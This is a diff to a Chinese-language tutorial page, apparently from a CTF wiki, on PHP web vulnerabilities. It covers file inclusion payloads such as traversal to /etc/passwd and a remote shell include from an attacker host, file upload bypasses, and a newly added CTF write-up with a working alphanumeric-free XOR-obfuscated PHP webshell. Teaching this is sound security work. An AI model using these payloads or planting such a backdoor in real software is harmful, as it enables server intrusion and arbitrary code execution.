@@ -2,9 +2,9 @@
 
 常见的导致文件包含的函数有：
 
--   PHP：`include()`，`include_once()`，`require()`，`require_once()`，`fopen()`，`readfile()` 等
--   JSP Servlet：`ava.io.File()`，`java.io.FileReader()` 等
--   ASP：`includefile`，`includevirtual` 等
+- PHP：`include()`，`include_once()`，`require()`，`require_once()`，`fopen()`，`readfile()` 等
+- JSP Servlet：`ava.io.File()`，`java.io.FileReader()` 等
+- ASP：`includefile`，`includevirtual` 等
 
 当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。
 
@@ -23,29 +23,29 @@ if (file_exists('/home/wwwrun/'.$file.'.php')) {
 
 上述代码存在本地文件包含，可用 %00 截断的方式读取 `/etc/passwd` 文件内容。
 
--   `%00` 截断
+- `%00` 截断
 
-    ```
-    ?file=../../../../../../../../../etc/passwd%00
-    ```
+  ```
+  ?file=../../../../../../../../../etc/passwd%00
+  ```
 
-    需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。
+  需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。
 
--   路径长度截断
+- 路径长度截断
 
-    ```
-    ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
-    ```
+  ```
+  ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
+  ```
 
-    Linux 需要文件名长于 4096，Windows 需要长于 256。
+  Linux 需要文件名长于 4096，Windows 需要长于 256。
 
--   点号截断
+- 点号截断
 
-    ```
-    ?file=../../../../../../../../../boot.ini/………[…]…………
-    ```
+  ```
+  ?file=../../../../../../../../../boot.ini/………[…]…………
+  ```
 
-    只适用 Windows，点号需要长于 256。
+  只适用 Windows，点号需要长于 256。
 
 ### 远程文件包含
 
@@ -74,45 +74,45 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。
 
--   普通远程文件包含
+- 普通远程文件包含
 
-    ```
-    ?file=[http|https|ftp]://example.com/shell.txt
-    ```
+  ```
+  ?file=[http|https|ftp]://example.com/shell.txt
+  ```
 
-    需要 `allow_url_fopen=On` 并且 `allow_url_include=On` 。
+  需要 `allow_url_fopen=On` 并且 `allow_url_include=On` 。
 
--   利用 PHP 流 input
+- 利用 PHP 流 input
 
-    ```
-    ?file=php://input
-    ```
+  ```
+  ?file=php://input
+  ```
 
-    需要 `allow_url_include=On` 。
+  需要 `allow_url_include=On` 。
 
--   利用 PHP 流 filter
+- 利用 PHP 流 filter
 
-    ```
-    ?file=php://filter/convert.base64-encode/resource=index.php
-    ```
+  ```
+  ?file=php://filter/convert.base64-encode/resource=index.php
+  ```
 
-    需要 `allow_url_include=On` 。
+  需要 `allow_url_include=On` 。
 
--   利用 data URIs
+- 利用 data URIs
 
-    ```
-    ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
-    ```
+  ```
+  ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+  ```
 
-    需要 `allow_url_include=On` 。
+  需要 `allow_url_include=On` 。
 
--   利用 XSS 执行
+- 利用 XSS 执行
 
-    ```
-    ?file=http://127.0.0.1/path/xss.php?xss=phpcode
-    ```
+  ```
+  ?file=http://127.0.0.1/path/xss.php?xss=phpcode
+  ```
 
-    需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
+  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
 
 ## 文件上传
 
@@ -120,47 +120,47 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 ### 绕过上传检查
 
--   前端检查扩展名
+- 前端检查扩展名
 
-    抓包绕过即可。
+  抓包绕过即可。
 
--   `Content-Type` 检测文件类型
+- `Content-Type` 检测文件类型
 
-    抓包修改 `Content-Type` 类型，使其符合白名单规则。
+  抓包修改 `Content-Type` 类型，使其符合白名单规则。
 
--   服务端添加后缀
+- 服务端添加后缀
 
-    尝试 `%00` 截断。
+  尝试 `%00` 截断。
 
--   服务端扩展名检测
+- 服务端扩展名检测
 
-    利用解析漏洞。
+  利用解析漏洞。
 
--   Apache 解析
+- Apache 解析
 
-    `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
+  `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
 
--   IIS 解析
+- IIS 解析
 
-    IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。
+  IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。
 
--   PHP CGI 路径解析
+- PHP CGI 路径解析
 
-    当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下
+  当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下
 
-    ```nginx
-    location ~ \.php$ {
-      root html;
-      fastcgi_pass 127.0.0.1:9000;
-      fastcgi_index index.php;
-      fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
-      include fastcgi_param;
-    }
-    ```
+  ```nginx
+  location ~ \.php$ {
+    root html;
+    fastcgi_pass 127.0.0.1:9000;
+    fastcgi_index index.php;
+    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+    include fastcgi_param;
+  }
+  ```
 
--   其他方式
+- 其他方式
 
-    后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。
+  后缀大小写、双写、特殊后缀如 `php5` 等，修改包内容的大小写过 WAF 等。
 
 ## 变量覆盖
 
@@ -283,6 +283,199 @@ preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
 ```
 
 如果没有 `/e` 修饰符，可以尝试 %00 截断。
+
+### `preg_match` 代码执行
+
+`preg_match` 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。
+
+```
+<?php
+include 'flag.php';
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(strlen($code)>40){
+        die("Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+//$hint =  "php function getFlag() to get flag";
+?>
+```
+
+这道题是 `xman` 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 `A-Z`、`a-z`、`0-9` 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 `a-z` 中任意一个字符，并且字符串长度小于 `40` 。然后再利用 `PHP` 允许动态函数执行的特点，拼接出一个函数名，这里我们是 `getFlag`，然后动态执行该代码即可。
+
+那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 `getFlag` 函数，然后拿到 `webshell` 。
+
+在理解这个之前，我们首先需要大家了解的是 `PHP` 中异或 `^` 的概念。
+
+我们先看一下下面这段代码：
+
+```
+<?php
+    echo "A"^"?";
+?>
+```
+
+运行结果如下：
+
+![](./figure/preg_match/answer1.png)
+
+我们可以看到，输出的结果是字符 `~`。之所以会得到这样的结果，是因为代码中对字符 `A` 和字符 `?` 进行了异或操作。在 `PHP` 中，两个变量进行异或时，先会将字符串转换成 `ASCII` 值，再将 `ASCII` 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 `ASCII` 值，再将 `ASCII` 值转换成字符串。异或操作有时也被用来交换两个变量的值。
+
+比如像上面这个例子
+
+`A` 的 `ASCII` 值是 `65` ，对应的二进制值是 `01000001`
+
+`?` 的ASCII值是 `63` ，对应的二进制值是 `00111111`
+
+异或的二进制的值是 `10000000` ，对应的 `ASCII` 值是 `126` ，对应的字符串的值就是 `~` 了
+
+我们都知道， `PHP` 是弱类型的语言，也就是说在 `PHP` 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 `PHP` 弱类型的这个特点，我们对 `PHP` 的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：
+
+```
+<?php
+    function B(){
+        echo "Hello Angel_Kitty";
+    }
+    $_++;
+    $__= "?" ^ "}";
+    $__();
+?>
+```
+
+代码执行结果如下：
+
+![](./figure/preg_match/answer2.png)
+
+我们一起来分析一下上面这段代码：
+
+1、`$_++; ` 这行代码的意思是对变量名为 `"_"` 的变量进行自增操作，在 `PHP` 中未定义的变量默认值 `null` ，`null==false==0` ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。
+
+2、`$__="?" ^ "}"; ` 对字符 `?` 和 `}` 进行异或运算，得到结果 `B` 赋给变量名为 `__` (两个下划线)的变量
+
+3、`$ __ (); ` 通过上面的赋值操作，变量 `$__` 的值为 `B` ，所以这行可以看作是 `B()` ，在 `PHP` 中，这行代码表示调用函数 `B` ，所以执行结果为 `Hello Angel_Kitty` 。在 `PHP` 中，我们可以将字符串当作函数来处理。
+
+看到这里，相信大家如果再看到类似的 `PHP` 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。
+
+我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 `_POST` ， `system` ， `call_user_func_array `，或者是任何我们需要的东西。
+
+下面是个非常简单的非数字字母的 `PHP` 后门：
+
+```
+<?php
+    @$_++; // $_ = 1
+    $__=("#"^"|"); // $__ = _
+    $__.=("."^"~"); // _P
+    $__.=("/"^"`"); // _PO
+    $__.=("|"^"/"); // _POS
+    $__.=("{"^"/"); // _POST 
+    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
+?>
+```
+
+在这里我说明下， `.=` 是字符串的连接，具体参看 `PHP` 语法
+
+我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：
+
+```
+$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
+```
+
+我们回到 `xman` 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 `40` 呢？
+
+我们最终是要读取到那个 `getFlag` 函数，我们需要构造一个 `_GET` 来去读取这个函数，我们最终构造了如下字符串：
+
+![](./figure/preg_match/payloads.png)
+
+可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。
+
+#### 构造 `_GET` 读取
+
+首先我们得知道 `_GET` 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：
+
+```
+<?php
+    echo "`{{{"^"?<>/";//_GET
+?>
+```
+
+这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。  
+这里可以使用php中可以执行命令的反引号 `` ` `` 和 `Linux` 下面的通配符 `?`
+
+- `?` 代表匹配一个字符
+- `` ` 表示执行命令
+- `" ` 对特殊字符串进行解析
+
+由于 `?` 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：
+
+```
+<?php
+    echo "{"^"<";
+?>
+```
+
+输出结果为：
+
+![](./figure/preg_match/answer3.png)
+
+```
+<?php
+    echo "{"^">";
+?>
+```
+
+输出结果为：
+
+![](./figure/preg_match/answer4.png)
+
+```
+<?php
+    echo "{"^"/";
+?>
+```
+
+输出结果为：
+
+![](./figure/preg_match/answer5.png)
+
+所以我们可以知道， `_GET` 就是这么被构造出来的啦！
+
+#### 获取 `_GET` 参数
+
+我们又该如何获取 `_GET` 参数呢？咱们可以构造出如下字串：
+
+```
+<?php
+    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
+?>
+```
+
+根据前面构造的来看， `$_` 已经变成了 `_GET` 。顺理成章的来讲， `$_ = _GET` 。我们构建 `$_GET[__]` 是为了要获取参数值。
+
+#### 传入参数
+
+此时我们只需要去调用 `getFlag` 函数获取 `webshell` 就好了，构造如下：
+
+```
+<?php
+    echo $_=getFlag;//getFlag
+?>
+```
+
+所以把参数全部连接起来，就可以了。
+
+![](./figure/preg_match/payloads.png)
+
+结果如下：
+
+![](./figure/preg_match/flag.png)
+
+于是我们就成功地读取到了flag！
 
 ### 动态函数执行
 
@@ -663,11 +856,11 @@ WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系
 
 WEB-INF 主要包含一下文件或目录：
 
--   `/WEB-INF/web.xml` ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
--   `/WEB-INF/classes/` ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。
--   `/WEB-INF/lib/` ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。
--   `/WEB-INF/src/` ：源码目录，按照包名结构放置各个 java 文件。
--   `/WEB-INF/database.properties` ：数据库配置文件。
+- `/WEB-INF/web.xml` ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+- `/WEB-INF/classes/` ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。
+- `/WEB-INF/lib/` ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。
+- `/WEB-INF/src/` ：源码目录，按照包名结构放置各个 java 文件。
+- `/WEB-INF/database.properties` ：数据库配置文件。
 
 通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：
 
@@ -687,3 +880,7 @@ http://url/CVS/Entries 返回所有文件的结构
 ```shell
 bk clone http://url/name dir
 ```
+
+### 参考文献
+
+- [记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)](https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html)
